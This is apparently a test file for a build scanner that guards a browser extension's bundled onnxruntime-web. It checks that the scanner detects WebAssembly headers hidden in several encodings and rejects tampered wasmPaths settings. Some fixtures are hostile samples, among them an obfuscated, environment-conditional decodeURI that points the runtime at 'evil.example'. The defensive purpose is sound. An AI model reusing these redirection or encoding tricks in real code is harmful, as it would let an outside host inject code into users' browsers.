import { describe, expect, it } from 'vitest';
import { importsRuntime, scriptProblems, wasmSignatures } from '../../scripts/lib/wasm-scan';
import { REAL_CHUNK } from './helpers/runtime-chunk';

// WebAssembly can reach a built script as bytes: written out as a literal, base64, hex, an escape or a number list.
// Whatever the spelling, a script of the build that carries the header of a module (\0asm) is refused, unless it is
// one of the pinned vendor files (checked by path and sha256 elsewhere).
describe('wasmSignatures', () => {
  const NUL = String.fromCharCode(0);
  it.each([
    ['the raw header bytes', `var m="${NUL}asm${String.fromCharCode(1)}";`],
    ['a \\0 escape', 'var m="\\0asm\\x01";'],
    ['a \\x00 escape', 'var m="\\x00asm";'],
    ['a \\u0000 escape', 'var m="\\u0000asm";'],
    ['a \\u{0} escape', 'var m="\\u{0}asm";'],
    ['an octal escape', 'var m="\\000asm";'],
    [
      'base64',
      'fetch("data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDYWRkAAAKCQEHACAAQQFqCw==")',
    ],
    ['base64 alone', 'const b="AGFzbQ";'],
    ['a hex string', 'const h="0061736d01000000";'],
    ['a hex string in upper case', 'const h="0061736D01000000";'],
    ['a decimal list', 'new Uint8Array([0,97,115,109,1,0,0,0])'],
    ['a decimal list with spaces', 'new Uint8Array([ 0 , 97 , 115 , 109 ])'],
    ['String.fromCharCode', 'String.fromCharCode(0,97,115,109)'],
    ['a hex list', 'new Uint8Array([0x00,0x61,0x73,0x6d])'],
    ['a hex list in upper case', 'new Uint8Array([0X00,0X61,0X73,0X6D])'],
    ['a mixed list', 'new Uint8Array([0,0x61,115,0b1101101])'],
    ['an octal list', 'new Uint8Array([0,0o141,0o163,0o155])'],
    ['a reference to a .wasm file', 'fetch("https://cdn.example.com/x.wasm")'],
    ['a relative .wasm file', 'new URL("./x.wasm", import.meta.url)'],
  ])('finds %s', (_name, code) => {
    expect(wasmSignatures(code), code).not.toEqual([]);
  });

  it.each([
    'const a=[0,97,115];',
    'const a=[1,97,115,109];',
    'var s="asm.js";',
    'const wasm="webassembly";',
    'x.wasmPaths',
    'const n="AGFzb";',
    'var t="00617365";',
    'const w=document.createElement("wasm-viewer");',
    'return t.slice(0,97)+u.slice(115,109)',
  ])('does not mistake %j for a module', (code) => {
    expect(wasmSignatures(code), code).toEqual([]);
  });
});

describe('scriptProblems: the settings that would make onnxruntime-web load other code or bytes', () => {
  const RESULT = 'assets/result-4HZRFhwR.js';
  const withWasmPaths = (rhs: string) =>
    REAL_CHUNK.replace('.wasm.wasmPaths=I()', `.wasm.wasmPaths=${rhs}`);

  it('recognises the chunk that imports the vendored runtime', () => {
    expect(importsRuntime(REAL_CHUNK)).toBe(true);
    expect(importsRuntime("import*as o from'../ort/ort.wasm.min.mjs';")).toBe(true);
    for (const other of [
      'import*as o from"../ort/other.mjs";',
      'import*as o from"./ort/ort.wasm.min.mjs";',
      'const a="../ort/ort.wasm.min.mjs";',
    ]) {
      expect(importsRuntime(other), other).toBe(false);
    }
  });

  it('accepts the chunk as the build emits it', () => {
    expect(scriptProblems(RESULT, REAL_CHUNK)).toEqual([]);
  });

  it('accepts the inlined spelling too: the value written in place', () => {
    expect(scriptProblems(RESULT, withWasmPaths('chrome.runtime.getURL("ort/")'))).toEqual([]);
  });

  it.each([
    [
      'a decoded string, conditional on the environment (the review of PR #6)',
      'decodeURI("getManifest"in chrome.runtime&&!navigator.webdriver?"%68ttps://evil.example/ort/":I())',
    ],
    ['a different call', 'g()'],
    ['a call with an argument', 'I("x")'],
    ['another directory', 'chrome.runtime.getURL("ort/x/")'],
    ['another file of the extension', 'chrome.runtime.getURL("ort/ort-wasm-simd-threaded.wasm")'],
    ['a string literal', '"https://evil.example/ort/"'],
    ['a template', '`https://evil.example/ort/`'],
    ['an object', '{wasm:"https://evil.example/x",mjs:I()}'],
    ['a frozen object', 'Object.freeze({mjs:I(),wasm:"https://evil.example/x"})'],
    ['a conditional', 'a?I():"x"'],
    ['a variable', 'where'],
    ['a member', 'cfg.url'],
    ['a sequence', '(0,I())'],
  ])('rejects wasmPaths set from %s', (_what, rhs) => {
    expect(scriptProblems(RESULT, withWasmPaths(rhs)).join('\n'), rhs).toContain('wasmPaths');
  });

  it('rejects a function that returns anything but exactly the packaged directory', () => {
    for (const body of [
      'chrome.runtime.getURL("ort/x")',
      'decodeURI("%68ttps://evil.example/")',
      'chrome.runtime.getURL("ort/")+"x"',
    ]) {
      const chunk = REAL_CHUNK.replace(
        'var I=()=>chrome.runtime.getURL("ort/")',
        `var I=()=>${body}`,
      );
      expect(scriptProblems(RESULT, chunk).join('\n'), body).toContain('wasmPaths');
    }
  });

  it('rejects a second assignment and an undefined function', () => {
    expect(scriptProblems(RESULT, `${REAL_CHUNK};e.wasm.wasmPaths=I()`).join('\n')).toContain(
      'wasmPaths',
    );
    expect(
      scriptProblems(
        RESULT,
        REAL_CHUNK.replace('var I=()=>chrome.runtime.getURL("ort/");', ''),
      ).join('\n'),
    ).toContain('wasmPaths');
    expect(
      scriptProblems(RESULT, `${REAL_CHUNK};var I=()=>chrome.runtime.getURL("ort/")`).join('\n'),
    ).toContain('wasmPaths');
  });

  it('rejects any other mention of the two names in that chunk', () => {
    for (const extra of [
      'x.wasmBinary=b',
      'use(o.env.wasm.wasmPaths)',
      'const{wasmPaths:p}=o.env.wasm',
      'init({wasmPaths:u})',
      'Reflect.set(o.env.wasm,"wasmBinary",b)',
    ]) {
      expect(scriptProblems(RESULT, `${REAL_CHUNK};${extra}`).join('\n'), extra).toMatch(
        /wasmPaths|wasmBinary/,
      );
    }
  });

  it.each([
    'assets/welcome-abc.js',
    'assets/i18n-abc.js',
    'background.js',
    'select.js',
    'assets/ort/result-abc.js',
    'result-abc.js',
  ])('rejects the two names in %s, which does not configure the runtime', (file) => {
    expect(scriptProblems(file, 'o.env.wasm.wasmPaths=I()').join('\n')).toContain('wasmPaths');
    expect(scriptProblems(file, 'o.env.wasm.wasmBinary=b').join('\n')).toContain('wasmBinary');
  });

  it('reports a module header in any script', () => {
    expect(scriptProblems('assets/x.js', 'new Uint8Array([0,97,115,109])').join('\n')).toMatch(
      /WebAssembly module/,
    );
  });

  it('has nothing to say about an ordinary script', () => {
    expect(scriptProblems('assets/x.js', 'export const a=1;function f(){return[0,1,2,3]}')).toEqual(
      [],
    );
  });
});
